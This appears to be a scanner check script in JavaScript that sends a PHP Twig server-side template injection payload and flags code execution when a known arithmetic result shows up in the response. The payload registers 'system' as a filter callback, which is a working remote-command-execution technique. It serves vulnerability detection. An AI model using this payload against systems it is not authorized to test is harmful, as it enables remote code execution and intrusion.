var attacks = [
    {
      attack: '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("SET%20/A%20268409241%20-%2027669")}}',
    }
  ];
  
  function analyze(response) {

    if(response.Body.indexOf('Results:') > -1){
        console.log(response.Body.substr(response.Body.indexOf('Results:'), 25))
        console.log(response.URL)
    }

    if (response.Body.indexOf('268381572268381572') > -1) {
      console.log("Code Execution via SSTI (PHP Twig) in " + response.URL)

      return true
    }

    return false
  }